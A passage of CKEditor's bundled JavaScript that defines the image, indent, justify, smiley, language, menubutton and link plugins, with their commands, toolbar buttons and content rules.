                    c.baseProto.detach.call(this), this.clearCustomData(), e.getDocumentElement().clearCustomData(),
                    t.clearCustomData(), CKEDITOR.tools.removeFunction(this._.frameLoadedHandler), (e = t.removeCustomData("onResize")) && e.removeListener(),
                    t.remove();
                }
            }
        });
    }(), CKEDITOR.config.disableObjectResizing = !1, CKEDITOR.config.disableNativeTableHandles = !0,
    CKEDITOR.config.disableNativeSpellChecker = !0, CKEDITOR.config.contentsCss = CKEDITOR.getUrl("contents.css"),
    function() {
        function o(e, t) {
            if (t || (t = e.getSelection().getSelectedElement()), t && t.is("img") && !t.data("cke-realelement") && !t.isReadOnly()) return t;
        }
        function a(e) {
            var t = e.getStyle("float");
            return "inherit" != t && "none" != t || (t = 0), t || (t = e.getAttribute("align")),
            t;
        }
        CKEDITOR.plugins.add("image", {
            requires: "dialog",
            init: function(t) {
                if (!t.plugins.image2) {
                    CKEDITOR.dialog.add("image", this.path + "dialogs/image.js");
                    var e = "img[alt,!src]{border-style,border-width,float,height,margin,margin-bottom,margin-left,margin-right,margin-top,width}";
                    CKEDITOR.dialog.isTabEnabled(t, "image", "advanced") && (e = "img[alt,dir,id,lang,longdesc,!src,title]{*}(*)"),
                    t.addCommand("image", new CKEDITOR.dialogCommand("image", {
                        allowedContent: e,
                        requiredContent: "img[alt,src]",
                        contentTransformations: [ [ "img{width}: sizeToStyle", "img[width]: sizeToAttribute" ], [ "img{float}: alignmentToStyle", "img[align]: alignmentToAttribute" ] ]
                    })), t.ui.addButton && t.ui.addButton("Image", {
                        label: t.lang.common.image,
                        command: "image",
                        toolbar: "insert,10"
                    }), t.on("doubleclick", function(e) {
                        var t = e.data.element;
                        t.is("img") && !t.data("cke-realelement") && !t.isReadOnly() && (e.data.dialog = "image");
                    }), t.addMenuItems && t.addMenuItems({
                        image: {
                            label: t.lang.image.menu,
                            command: "image",
                            group: "image"
                        }
                    }), t.contextMenu && t.contextMenu.addListener(function(e) {
                        if (o(t, e)) return {
                            image: CKEDITOR.TRISTATE_OFF
                        };
                    });
                }
            },
            afterInit: function(i) {
                function e(n) {
                    var e = i.getCommand("justify" + n);
                    e && ("left" != n && "right" != n || e.on("exec", function(e) {
                        var t = o(i);
                        t && (a(t) == n ? (t.removeStyle("float"), n == a(t) && t.removeAttribute("align")) : t.setStyle("float", n),
                        e.cancel());
                    }), e.on("refresh", function(e) {
                        var t = o(i);
                        t && (t = a(t), this.setState(t == n ? CKEDITOR.TRISTATE_ON : "right" == n || "left" == n ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED),
                        e.cancel());
                    }));
                }
                i.plugins.image2 || (e("left"), e("right"), e("center"), e("block"));
            }
        });
    }(), CKEDITOR.config.image_removeLinkByEmptyURL = !0, function() {
        function t(t, e) {
            var n, i;
            e.on("refresh", function(e) {
                var t, n = [ o ];
                for (t in e.data.states) n.push(e.data.states[t]);
                this.setState(CKEDITOR.tools.search(n, a) ? a : o);
            }, e, null, 100), e.on("exec", function(e) {
                n = t.getSelection(), i = n.createBookmarks(1), e.data || (e.data = {}), e.data.done = !1;
            }, e, null, 0), e.on("exec", function() {
                t.forceNextSelectionCheck(), n.selectBookmarks(i);
            }, e, null, 100);
        }
        var o = CKEDITOR.TRISTATE_DISABLED, a = CKEDITOR.TRISTATE_OFF;
        CKEDITOR.plugins.add("indent", {
            init: function(l) {
                var e = CKEDITOR.plugins.indent.genericDefinition;
                t(l, l.addCommand("indent", new e(!0))), t(l, l.addCommand("outdent", new e())),
                l.ui.addButton && (l.ui.addButton("Indent", {
                    label: l.lang.indent.indent,
                    command: "indent",
                    directional: !0,
                    toolbar: "indent,20"
                }), l.ui.addButton("Outdent", {
                    label: l.lang.indent.outdent,
                    command: "outdent",
                    directional: !0,
                    toolbar: "indent,10"
                })), l.on("dirChanged", function(e) {
                    var t = l.createRange(), n = e.data.node;
                    t.setStartBefore(n), t.setEndAfter(n);
                    for (var i, o = new CKEDITOR.dom.walker(t); i = o.next(); ) if (i.type == CKEDITOR.NODE_ELEMENT) if (!i.equals(n) && i.getDirection()) t.setStartAfter(i),
                    o = new CKEDITOR.dom.walker(t); else {
                        var a = l.config.indentClasses;
                        if (a) for (var r = "ltr" == e.data.dir ? [ "_rtl", "" ] : [ "", "_rtl" ], s = 0; s < a.length; s++) i.hasClass(a[s] + r[0]) && (i.removeClass(a[s] + r[0]),
                        i.addClass(a[s] + r[1]));
                        a = i.getStyle("margin-right"), r = i.getStyle("margin-left"), a ? i.setStyle("margin-left", a) : i.removeStyle("margin-left"),
                        r ? i.setStyle("margin-right", r) : i.removeStyle("margin-right");
                    }
                });
            }
        }), CKEDITOR.plugins.indent = {
            genericDefinition: function(e) {
                this.isIndent = !!e, this.startDisabled = !this.isIndent;
            },
            specificDefinition: function(e, t, n) {
                this.name = t, this.editor = e, this.jobs = {}, this.enterBr = e.config.enterMode == CKEDITOR.ENTER_BR,
                this.isIndent = !!n, this.relatedGlobal = n ? "indent" : "outdent", this.indentKey = n ? 9 : CKEDITOR.SHIFT + 9,
                this.database = {};
            },
            registerCommands: function(e, t) {
                e.on("pluginsLoaded", function() {
                    for (var e in t) !function(t, n) {
                        var i, e = t.getCommand(n.relatedGlobal);
                        for (i in n.jobs) e.on("exec", function(e) {
                            e.data.done || (t.fire("lockSnapshot"), n.execJob(t, i) && (e.data.done = !0), t.fire("unlockSnapshot"),
                            CKEDITOR.dom.element.clearAllMarkers(n.database));
                        }, this, null, i), e.on("refresh", function(e) {
                            e.data.states || (e.data.states = {}), e.data.states[n.name + "@" + i] = n.refreshJob(t, i, e.data.path);
                        }, this, null, i);
                        t.addFeature(n);
                    }(this, t[e]);
                });
            }
        }, CKEDITOR.plugins.indent.genericDefinition.prototype = {
            context: "p",
            exec: function() {}
        }, CKEDITOR.plugins.indent.specificDefinition.prototype = {
            execJob: function(e, t) {
                var n = this.jobs[t];
                if (n.state != o) return n.exec.call(this, e);
            },
            refreshJob: function(e, t, n) {
                return (t = this.jobs[t]).state = e.activeFilter.checkFeature(this) ? t.refresh.call(this, e, n) : o,
                t.state;
            },
            getContext: function(e) {
                return e.contains(this.context);
            }
        };
    }(), function() {
        function i(e, t, n) {
            if (!e.getCustomData("indent_processed")) {
                var i = this.editor, o = this.isIndent;
                if (t) {
                    if (n = 0, (i = e.$.className.match(this.classNameRegex)) && (i = i[1], n = CKEDITOR.tools.indexOf(t, i) + 1),
                    (n += o ? 1 : -1) < 0) return;
                    n = Math.min(n, t.length), n = Math.max(n, 0), e.$.className = CKEDITOR.tools.ltrim(e.$.className.replace(this.classNameRegex, "")),
                    0 < n && e.addClass(t[n - 1]);
                } else {
                    t = r(e, n), n = parseInt(e.getStyle(t), 10);
                    var a = i.config.indentOffset || 40;
                    if (isNaN(n) && (n = 0), (n += (o ? 1 : -1) * a) < 0) return;
                    n = Math.max(n, 0), n = Math.ceil(n / a) * a, e.setStyle(t, n ? n + (i.config.indentUnit || "px") : ""),
                    "" === e.getAttribute("style") && e.removeAttribute("style");
                }
                CKEDITOR.dom.element.setMarker(this.database, e, "indent_processed", 1);
            }
        }
        function r(e, t) {
            return "ltr" == (t || e.getComputedStyle("direction")) ? "margin-left" : "margin-right";
        }
        var s = CKEDITOR.dtd.$listItem, o = CKEDITOR.dtd.$list, l = CKEDITOR.TRISTATE_DISABLED, c = CKEDITOR.TRISTATE_OFF;
        CKEDITOR.plugins.add("indentblock", {
            requires: "indent",
            init: function(e) {
                function t() {
                    n.specificDefinition.apply(this, arguments), this.allowedContent = {
                        "div h1 h2 h3 h4 h5 h6 ol p pre ul": {
                            propertiesOnly: !0,
                            styles: a ? null : "margin-left,margin-right",
                            classes: a || null
                        }
                    }, this.enterBr && (this.allowedContent.div = !0), this.requiredContent = (this.enterBr ? "div" : "p") + (a ? "(" + a.join(",") + ")" : "{margin-left}"),
                    this.jobs = {
                        20: {
                            refresh: function(e, t) {
                                if ((i = t.block || t.blockLimit).is(s) || (i = i.getAscendant(s) || i), i.is(s) && (i = i.getParent()),
                                !this.enterBr && !this.getContext(t)) return l;
                                if (a) {
                                    var n;
                                    n = a;
                                    var i = i.$.className.match(this.classNameRegex), o = this.isIndent;
                                    return (n = i ? !o || i[1] != n.slice(-1) : o) ? c : l;
                                }
                                return this.isIndent ? c : i ? CKEDITOR[(parseInt(i.getStyle(r(i)), 10) || 0) <= 0 ? "TRISTATE_DISABLED" : "TRISTATE_OFF"] : l;
                            },
                            exec: function(e) {
                                var t, n = (n = e.getSelection()) && n.getRanges()[0];
                                if (t = e.elementPath().contains(o)) i.call(this, t, a); else for (n = n.createIterator(),
                                e = e.config.enterMode, n.enforceRealBlocks = !0, n.enlargeBr = e != CKEDITOR.ENTER_BR; t = n.getNextParagraph(e == CKEDITOR.ENTER_P ? "p" : "div"); ) t.isReadOnly() || i.call(this, t, a);
                                return !0;
                            }
                        }
                    };
                }
                var n = CKEDITOR.plugins.indent, a = e.config.indentClasses;
                n.registerCommands(e, {
                    indentblock: new t(e, "indentblock", !0),
                    outdentblock: new t(e, "outdentblock")
                }), CKEDITOR.tools.extend(t.prototype, n.specificDefinition.prototype, {
                    context: {
                        div: 1,
                        dl: 1,
                        h1: 1,
                        h2: 1,
                        h3: 1,
                        h4: 1,
                        h5: 1,
                        h6: 1,
                        ul: 1,
                        ol: 1,
                        p: 1,
                        pre: 1,
                        table: 1
                    },
                    classNameRegex: a ? RegExp("(?:^|\\s+)(" + a.join("|") + ")(?=$|\\s)") : null
                });
            }
        });
    }(), function() {
        function o(d) {
            for (var u, h = this, f = this.database, m = this.context, e = ((e = d.getSelection()) && e.getRanges()).createIterator(); u = e.getNextRange(); ) {
                for (var t = u.getCommonAncestor(); t && (t.type != CKEDITOR.NODE_ELEMENT || !m[t.getName()]); ) t = t.getParent();
                if (t || (t = u.startPath().contains(m)) && u.setEndAt(t, CKEDITOR.POSITION_BEFORE_END),
                !t) {
                    var n = u.getEnclosedNode();
                    n && n.type == CKEDITOR.NODE_ELEMENT && n.getName() in m && (u.setStartAt(n, CKEDITOR.POSITION_AFTER_START),
                    u.setEndAt(n, CKEDITOR.POSITION_BEFORE_END), t = n);
                }
                if (t && u.startContainer.type == CKEDITOR.NODE_ELEMENT && u.startContainer.getName() in m && ((n = new CKEDITOR.dom.walker(u)).evaluator = a,
                u.startContainer = n.next()), t && u.endContainer.type == CKEDITOR.NODE_ELEMENT && u.endContainer.getName() in m && ((n = new CKEDITOR.dom.walker(u)).evaluator = a,
                u.endContainer = n.previous()), t) return function(e) {
                    for (var t = u.startContainer, n = u.endContainer; t && !t.getParent().equals(e); ) t = t.getParent();
                    for (;n && !n.getParent().equals(e); ) n = n.getParent();
                    if (!t || !n) return !1;
                    for (var i = t, o = (t = [], !1); !o; ) i.equals(n) && (o = !0), t.push(i), i = i.getNext();
                    if (t.length < 1) return !1;
                    for (i = e.getParents(!0), n = 0; n < i.length; n++) if (i[n].getName && m[i[n].getName()]) {
                        e = i[n];
                        break;
                    }
                    i = h.isIndent ? 1 : -1, n = t[0], t = t[t.length - 1];
                    var a, r = (o = CKEDITOR.plugins.list.listToArray(e, f))[t.getCustomData("listarray_index")].indent;
                    for (n = n.getCustomData("listarray_index"); n <= t.getCustomData("listarray_index"); n++) if (o[n].indent += i,
                    0 < i) {
                        var s = o[n].parent;
                        o[n].parent = new CKEDITOR.dom.element(s.getName(), s.getDocument());
                    }
                    for (n = t.getCustomData("listarray_index") + 1; n < o.length && o[n].indent > r; n++) o[n].indent += i;
                    if (t = CKEDITOR.plugins.list.arrayToList(o, f, null, d.config.enterMode, e.getDirection()),
                    !h.isIndent && (a = e.getParent()) && a.is("li")) {
                        var l, c = [];
                        for (n = (i = t.listNode.getChildren()).count() - 1; 0 <= n; n--) (l = i.getItem(n)) && l.is && l.is("li") && c.push(l);
                    }
                    if (t && t.listNode.replace(e), c && c.length) for (n = 0; n < c.length; n++) {
                        for (l = e = c[n]; (l = l.getNext()) && l.is && l.getName() in m; ) CKEDITOR.env.needsNbspFiller && !e.getFirst(g) && e.append(u.document.createText(" ")),
                        e.append(l);
                        e.insertAfter(a);
                    }
                    return t && d.fire("contentDomInvalidated"), !0;
                }(t);
            }
            return 0;
        }
        function a(e) {
            return e.type == CKEDITOR.NODE_ELEMENT && e.is("li");
        }
        function g(e) {
            return t(e) && n(e);
        }
        var t = CKEDITOR.dom.walker.whitespaces(!0), n = CKEDITOR.dom.walker.bookmark(!1, !0), r = CKEDITOR.TRISTATE_DISABLED, s = CKEDITOR.TRISTATE_OFF;
        CKEDITOR.plugins.add("indentlist", {
            requires: "indent",
            init: function(e) {
                function t(n) {
                    i.specificDefinition.apply(this, arguments), this.requiredContent = [ "ul", "ol" ],
                    n.on("key", function(e) {
                        if ("wysiwyg" == n.mode && e.data.keyCode == this.indentKey) {
                            var t = this.getContext(n.elementPath());
                            !t || this.isIndent && CKEDITOR.plugins.indentList.firstItemInPath(this.context, n.elementPath(), t) || (n.execCommand(this.relatedGlobal),
                            e.cancel());
                        }
                    }, this), this.jobs[this.isIndent ? 10 : 30] = {
                        refresh: this.isIndent ? function(e, t) {
                            var n = this.getContext(t), i = CKEDITOR.plugins.indentList.firstItemInPath(this.context, t, n);
                            return n && this.isIndent && !i ? s : r;
                        } : function(e, t) {
                            return !this.getContext(t) || this.isIndent ? r : s;
                        },
                        exec: CKEDITOR.tools.bind(o, this)
                    };
                }
                var i = CKEDITOR.plugins.indent;
                i.registerCommands(e, {
                    indentlist: new t(e, "indentlist", !0),
                    outdentlist: new t(e, "outdentlist")
                }), CKEDITOR.tools.extend(t.prototype, i.specificDefinition.prototype, {
                    context: {
                        ol: 1,
                        ul: 1
                    }
                });
            }
        }), CKEDITOR.plugins.indentList = {}, CKEDITOR.plugins.indentList.firstItemInPath = function(e, t, n) {
            var i = t.contains(a);
            return n || (n = t.contains(e)), n && i && i.equals(n.getFirst(a));
        };
    }(), CKEDITOR.plugins.add("smiley", {
        requires: "dialog",
        init: function(e) {
            e.config.smiley_path = e.config.smiley_path || this.path + "images/", e.addCommand("smiley", new CKEDITOR.dialogCommand("smiley", {
                allowedContent: "img[alt,height,!src,title,width]",
                requiredContent: "img"
            })), e.ui.addButton && e.ui.addButton("Smiley", {
                label: e.lang.smiley.toolbar,
                command: "smiley",
                toolbar: "insert,50"
            }), CKEDITOR.dialog.add("smiley", this.path + "dialogs/smiley.js");
        }
    }), CKEDITOR.config.smiley_images = "regular_smile.png sad_smile.png wink_smile.png teeth_smile.png confused_smile.png tongue_smile.png embarrassed_smile.png omg_smile.png whatchutalkingabout_smile.png angry_smile.png angel_smile.png shades_smile.png devil_smile.png cry_smile.png lightbulb.png thumbs_down.png thumbs_up.png heart.png broken_heart.png kiss.png envelope.png".split(" "),
    CKEDITOR.config.smiley_descriptions = "smiley;sad;wink;laugh;frown;cheeky;blush;surprise;indecision;angry;angel;cool;devil;crying;enlightened;no;yes;heart;broken heart;kiss;mail".split(";"),
    function() {
        function h(e, t) {
            var n;
            if (t = void 0 === t || t) n = e.getComputedStyle("text-align"); else {
                for (;(!e.hasAttribute || !e.hasAttribute("align") && !e.getStyle("text-align")) && (n = e.getParent()); ) e = n;
                n = e.getStyle("text-align") || e.getAttribute("align") || "";
            }
            return n && (n = n.replace(/(?:-(?:moz|webkit)-)?(?:start|auto)/i, "")), !n && t && (n = "rtl" == e.getComputedStyle("direction") ? "right" : "left"),
            n;
        }
        function a(e, t, n) {
            this.editor = e, this.name = t, this.value = n, this.context = "p", t = e.config.justifyClasses;
            var i = e.config.enterMode == CKEDITOR.ENTER_P ? "p" : "div";
            if (t) {
                switch (n) {
                  case "left":
                    this.cssClassName = t[0];
                    break;

                  case "center":
                    this.cssClassName = t[1];
                    break;

                  case "right":
                    this.cssClassName = t[2];
                    break;

                  case "justify":
                    this.cssClassName = t[3];
                }
                this.cssClassRegex = RegExp("(?:^|\\s+)(?:" + t.join("|") + ")(?=$|\\s)"), this.requiredContent = i + "(" + this.cssClassName + ")";
            } else this.requiredContent = i + "{text-align}";
            this.allowedContent = {
                "caption div h1 h2 h3 h4 h5 h6 p pre td th li": {
                    propertiesOnly: !0,
                    styles: this.cssClassName ? null : "text-align",
                    classes: this.cssClassName || null
                }
            }, e.config.enterMode == CKEDITOR.ENTER_BR && (this.allowedContent.div = !0);
        }
        function r(e) {
            var t = e.editor, n = t.createRange();
            n.setStartBefore(e.data.node), n.setEndAfter(e.data.node);
            for (var i, o = new CKEDITOR.dom.walker(n); i = o.next(); ) if (i.type == CKEDITOR.NODE_ELEMENT) if (!i.equals(e.data.node) && i.getDirection()) n.setStartAfter(i),
            o = new CKEDITOR.dom.walker(n); else {
                var a = t.config.justifyClasses;
                a && (i.hasClass(a[0]) ? (i.removeClass(a[0]), i.addClass(a[2])) : i.hasClass(a[2]) && (i.removeClass(a[2]),
                i.addClass(a[0]))), "left" == (a = i.getStyle("text-align")) ? i.setStyle("text-align", "right") : "right" == a && i.setStyle("text-align", "left");
            }
        }
        a.prototype = {
            exec: function(e) {
                var t = e.getSelection(), n = e.config.enterMode;
                if (t) {
                    for (var i, o, a = t.createBookmarks(), r = t.getRanges(), s = this.cssClassName, l = void 0 === (l = e.config.useComputedState) || l, c = r.length - 1; 0 <= c; c--) for ((i = r[c].createIterator()).enlargeBr = n != CKEDITOR.ENTER_BR; o = i.getNextParagraph(n == CKEDITOR.ENTER_P ? "p" : "div"); ) if (!o.isReadOnly()) {
                        o.removeAttribute("align"), o.removeStyle("text-align");
                        var d = s && (o.$.className = CKEDITOR.tools.ltrim(o.$.className.replace(this.cssClassRegex, ""))), u = this.state == CKEDITOR.TRISTATE_OFF && (!l || h(o, !0) != this.value);
                        s ? u ? o.addClass(s) : d || o.removeAttribute("class") : u && o.setStyle("text-align", this.value);
                    }
                    e.focus(), e.forceNextSelectionCheck(), t.selectBookmarks(a);
                }
            },
            refresh: function(e, t) {
                var n = t.block || t.blockLimit;
                this.setState("body" != n.getName() && h(n, this.editor.config.useComputedState) == this.value ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF);
            }
        }, CKEDITOR.plugins.add("justify", {
            init: function(e) {
                if (!e.blockless) {
                    var t = new a(e, "justifyleft", "left"), n = new a(e, "justifycenter", "center"), i = new a(e, "justifyright", "right"), o = new a(e, "justifyblock", "justify");
                    e.addCommand("justifyleft", t), e.addCommand("justifycenter", n), e.addCommand("justifyright", i),
                    e.addCommand("justifyblock", o), e.ui.addButton && (e.ui.addButton("JustifyLeft", {
                        label: e.lang.justify.left,
                        command: "justifyleft",
                        toolbar: "align,10"
                    }), e.ui.addButton("JustifyCenter", {
                        label: e.lang.justify.center,
                        command: "justifycenter",
                        toolbar: "align,20"
                    }), e.ui.addButton("JustifyRight", {
                        label: e.lang.justify.right,
                        command: "justifyright",
                        toolbar: "align,30"
                    }), e.ui.addButton("JustifyBlock", {
                        label: e.lang.justify.block,
                        command: "justifyblock",
                        toolbar: "align,40"
                    })), e.on("dirChanged", r);
                }
            }
        });
    }(), CKEDITOR.plugins.add("menubutton", {
        requires: "button,menu",
        onLoad: function() {
            var t = function(t) {
                var n = this._, e = n.menu;
                n.state !== CKEDITOR.TRISTATE_DISABLED && (n.on && e ? e.hide() : (n.previousState = n.state,
                e || ((e = n.menu = new CKEDITOR.menu(t, {
                    panel: {
                        className: "cke_menu_panel",
                        attributes: {
                            "aria-label": t.lang.common.options
                        }
                    }
                })).onHide = CKEDITOR.tools.bind(function() {
                    var e = this.command ? t.getCommand(this.command).modes : this.modes;
                    this.setState(!e || e[t.mode] ? n.previousState : CKEDITOR.TRISTATE_DISABLED), n.on = 0;
                }, this), this.onMenu && e.addListener(this.onMenu)), this.setState(CKEDITOR.TRISTATE_ON),
                n.on = 1, setTimeout(function() {
                    e.show(CKEDITOR.document.getById(n.id), 4);
                }, 0)));
            };
            CKEDITOR.ui.menuButton = CKEDITOR.tools.createClass({
                base: CKEDITOR.ui.button,
                $: function(e) {
                    delete e.panel, this.base(e), this.hasArrow = !0, this.click = t;
                },
                statics: {
                    handler: {
                        create: function(e) {
                            return new CKEDITOR.ui.menuButton(e);
                        }
                    }
                }
            });
        },
        beforeInit: function(e) {
            e.ui.addHandler(CKEDITOR.UI_MENUBUTTON, CKEDITOR.ui.menuButton.handler);
        }
    }), CKEDITOR.UI_MENUBUTTON = "menubutton", CKEDITOR.plugins.add("language", {
        requires: "menubutton",
        init: function(i) {
            var e, t, n, o, a = i.config.language_list || [ "ar:Arabic:rtl", "fr:French", "es:Spanish" ], r = this, s = i.lang.language, l = {};
            for (i.addCommand("language", {
                allowedContent: "span[!lang,!dir]",
                requiredContent: "span[lang,dir]",
                contextSensitive: !0,
                exec: function(e, t) {
                    var n = l["language_" + t];
                    n && e[n.style.checkActive(e.elementPath(), e) ? "removeStyle" : "applyStyle"](n.style);
                },
                refresh: function(e) {
                    this.setState(r.getCurrentLangElement(e) ? CKEDITOR.TRISTATE_ON : CKEDITOR.TRISTATE_OFF);
                }
            }), o = 0; o < a.length; o++) t = (e = a[o].split(":"))[0], l[n = "language_" + t] = {
                label: e[1],
                langId: t,
                group: "language",
                order: o,
                ltr: "rtl" != ("" + e[2]).toLowerCase(),
                onClick: function() {
                    i.execCommand("language", this.langId);
                },
                role: "menuitemcheckbox"
            }, l[n].style = new CKEDITOR.style({
                element: "span",
                attributes: {
                    lang: t,
                    dir: l[n].ltr ? "ltr" : "rtl"
                }
            });
            l.language_remove = {
                label: s.remove,
                group: "language_remove",
                state: CKEDITOR.TRISTATE_DISABLED,
                order: l.length,
                onClick: function() {
                    var e = r.getCurrentLangElement(i);
                    e && i.execCommand("language", e.getAttribute("lang"));
                }
            }, i.addMenuGroup("language", 1), i.addMenuGroup("language_remove"), i.addMenuItems(l),
            i.ui.add("Language", CKEDITOR.UI_MENUBUTTON, {
                label: s.button,
                allowedContent: "span[!lang,!dir]",
                requiredContent: "span[lang,dir]",
                toolbar: "bidi,30",
                command: "language",
                onMenu: function() {
                    var e, t = {}, n = r.getCurrentLangElement(i);
                    for (e in l) t[e] = CKEDITOR.TRISTATE_OFF;
                    return t.language_remove = n ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                    n && (t["language_" + n.getAttribute("lang")] = CKEDITOR.TRISTATE_ON), t;
                }
            });
        },
        getCurrentLangElement: function(e) {
            var t, n = e.elementPath();
            if (e = n && n.elements, n) for (var i = 0; i < e.length; i++) n = e[i], !t && "span" == n.getName() && n.hasAttribute("dir") && n.hasAttribute("lang") && (t = n);
            return t;
        }
    }), function() {
        function u(e) {
            return e.replace(/'/g, "\\$&");
        }
        CKEDITOR.plugins.add("link", {
            requires: "dialog,fakeobjects",
            onLoad: function() {
                function e(e) {
                    return n.replace(/%1/g, "rtl" == e ? "right" : "left").replace(/%2/g, "cke_contents_" + e);
                }
                var t = "background:url(" + CKEDITOR.getUrl(this.path + "images" + (CKEDITOR.env.hidpi ? "/hidpi" : "") + "/anchor.png") + ") no-repeat %1 center;border:1px dotted #00f;background-size:16px;", n = ".%2 a.cke_anchor,.%2 a.cke_anchor_empty,.cke_editable.%2 a[name],.cke_editable.%2 a[data-cke-saved-name]{" + t + "padding-%1:18px;cursor:auto;}.%2 img.cke_anchor{" + t + "width:16px;min-height:15px;height:1.15em;vertical-align:text-bottom;}";
                CKEDITOR.addCss(e("ltr") + e("rtl"));
            },
            init: function(n) {
                var e, i, t = "a[!href]";
                CKEDITOR.dialog.isTabEnabled(n, "link", "advanced") && (t = t.replace("]", ",accesskey,charset,dir,id,lang,name,rel,tabindex,title,type]{*}(*)")),
                CKEDITOR.dialog.isTabEnabled(n, "link", "target") && (t = t.replace("]", ",target,onclick]")),
                n.addCommand("link", new CKEDITOR.dialogCommand("link", {
                    allowedContent: t,
                    requiredContent: "a[href]"
                })), n.addCommand("anchor", new CKEDITOR.dialogCommand("anchor", {
                    allowedContent: "a[!name,id]",
                    requiredContent: "a[name]"
                })), n.addCommand("unlink", new CKEDITOR.unlinkCommand()), n.addCommand("removeAnchor", new CKEDITOR.removeAnchorCommand()),
                n.setKeystroke(CKEDITOR.CTRL + 76, "link"), n.ui.addButton && (n.ui.addButton("Link", {
                    label: n.lang.link.toolbar,
                    command: "link",
                    toolbar: "links,10"
                }), n.ui.addButton("Unlink", {
                    label: n.lang.link.unlink,
                    command: "unlink",
                    toolbar: "links,20"
                }), n.ui.addButton("Anchor", {
                    label: n.lang.link.anchor.toolbar,
                    command: "anchor",
                    toolbar: "links,30"
                })), CKEDITOR.dialog.add("link", this.path + "dialogs/link.js"), CKEDITOR.dialog.add("anchor", this.path + "dialogs/anchor.js"),
                n.on("doubleclick", function(e) {
                    var t = CKEDITOR.plugins.link.getSelectedLink(n) || e.data.element;
                    t.isReadOnly() || (t.is("a") ? (e.data.dialog = !t.getAttribute("name") || t.getAttribute("href") && t.getChildCount() ? "link" : "anchor",
                    e.data.link = t) : CKEDITOR.plugins.link.tryRestoreFakeAnchor(n, t) && (e.data.dialog = "anchor"));
                }, null, null, 0), n.on("doubleclick", function(e) {
                    e.data.dialog in {
                        link: 1,
                        anchor: 1
                    } && e.data.link && n.getSelection().selectElement(e.data.link);
                }, null, null, 20), n.addMenuItems && n.addMenuItems({
                    anchor: {
                        label: n.lang.link.anchor.menu,
                        command: "anchor",
                        group: "anchor",
                        order: 1
                    },
                    removeAnchor: {
                        label: n.lang.link.anchor.remove,
                        command: "removeAnchor",
                        group: "anchor",
                        order: 5
                    },
                    link: {
                        label: n.lang.link.menu,
                        command: "link",
                        group: "link",
                        order: 1
                    },
                    unlink: {
                        label: n.lang.link.unlink,
                        command: "unlink",
                        group: "link",
                        order: 5
                    }
                }), n.contextMenu && n.contextMenu.addListener(function(e) {
                    if (!e || e.isReadOnly()) return null;
                    if (!(e = CKEDITOR.plugins.link.tryRestoreFakeAnchor(n, e)) && !(e = CKEDITOR.plugins.link.getSelectedLink(n))) return null;
                    var t = {};
                    return e.getAttribute("href") && e.getChildCount() && (t = {
                        link: CKEDITOR.TRISTATE_OFF,
                        unlink: CKEDITOR.TRISTATE_OFF
                    }), e && e.hasAttribute("name") && (t.anchor = t.removeAnchor = CKEDITOR.TRISTATE_OFF),
                    t;
                }), this.compiledProtectionFunction = ((e = (e = n).config.emailProtection || "") && "encode" != e && (i = {},
                e.replace(/^([^(]+)\(([^)]+)\)$/, function(e, t, n) {
                    i.name = t, i.params = [], n.replace(/[^,\s]+/g, function(e) {
                        i.params.push(e);
                    });
                })), i);
            },
            afterInit: function(n) {
                n.dataProcessor.dataFilter.addRules({
                    elements: {
                        a: function(e) {
                            return e.attributes.name ? e.children.length ? null : n.createFakeParserElement(e, "cke_anchor", "anchor") : null;
                        }
                    }
                });
                var e = n._.elementsPath && n._.elementsPath.filters;
                e && e.push(function(e, t) {
                    if ("a" == t && (CKEDITOR.plugins.link.tryRestoreFakeAnchor(n, e) || e.getAttribute("name") && (!e.getAttribute("href") || !e.getChildCount()))) return "anchor";
                });
            }
        });
        var c = /(?:^|,)([^=]+)=(\d+|yes|no)/gi, h = {
            id: "advId",
            dir: "advLangDir",
            accessKey: "advAccessKey",
            name: "advName",
            lang: "advLangCode",
            tabindex: "advTabIndex",
            title: "advTitle",
            type: "advContentType",
            class: "advCSSClasses",
            charset: "advCharset",
            style: "advStyles",
            rel: "advRel"
        };
        CKEDITOR.plugins.link = {
            getSelectedLink: function(e) {
                var t = e.getSelection(), n = t.getSelectedElement();
                return n && n.is("a") ? n : (t = t.getRanges()[0]) ? (t.shrink(CKEDITOR.SHRINK_TEXT),
                e.elementPath(t.getCommonAncestor()).contains("a", 1)) : null;
            },
            getEditorAnchors: function(e) {
                for (var t, n = (i = (n = e.editable()).isInline() && !e.plugins.divarea ? e.document : n).getElementsByTag("a"), i = i.getElementsByTag("img"), o = [], a = 0; t = n.getItem(a++); ) (t.data("cke-saved-name") || t.hasAttribute("name")) && o.push({
                    name: t.data("cke-saved-name") || t.getAttribute("name"),
                    id: t.getAttribute("id")
                });
                for (a = 0; t = i.getItem(a++); ) (t = this.tryRestoreFakeAnchor(e, t)) && o.push({
                    name: t.getAttribute("name"),
                    id: t.getAttribute("id")
                });
                return o;
            },
            fakeAnchor: !0,
            tryRestoreFakeAnchor: function(e, t) {
                if (t && t.data("cke-real-element-type") && "anchor" == t.data("cke-real-element-type")) {
                    var n = e.restoreRealElement(t);
                    if (n.data("cke-saved-name")) return n;
                }
            },
            parseLinkAttributes: function(e, t) {
                var n, i = t && (t.data("cke-saved-href") || t.getAttribute("href")) || "", r = e.plugins.link.compiledProtectionFunction, o = e.config.emailProtection, s = {};
                if (i.match(/^javascript:/) && ("encode" == o ? i = i.replace(/^javascript:void\(location\.href='mailto:'\+String\.fromCharCode\(([^)]+)\)(?:\+'(.*)')?\)$/, function(e, t, n) {
                    return "mailto:" + String.fromCharCode.apply(String, t.split(",")) + (n && n.replace(/\\'/g, "'"));
                }) : o && i.replace(/^javascript:([^(]+)\(([^)]+)\)$/, function(e, t, n) {
                    if (t == r.name) {
                        s.type = "email", e = s.email = {}, t = /(^')|('$)/g;
                        for (var i, o = (n = n.match(/[^,\s]+/g)).length, a = 0; a < o; a++) i = decodeURIComponent(i = n[a].replace(t, "").replace(/\\'/g, "'")),
                        e[r.params[a].toLowerCase()] = i;
                        e.address = [ e.name, e.domain ].join("@");
                    }
                })), !s.type) if (o = i.match(/^#(.*)$/)) s.type = "anchor", s.anchor = {}, s.anchor.name = s.anchor.id = o[1]; else if (o = i.match(/^mailto:([^?]+)(?:\?(.+))?$/)) {
                    n = i.match(/subject=([^;?:@&=$,\/]*)/), i = i.match(/body=([^;?:@&=$,\/]*)/), s.type = "email";
                    var a = s.email = {};
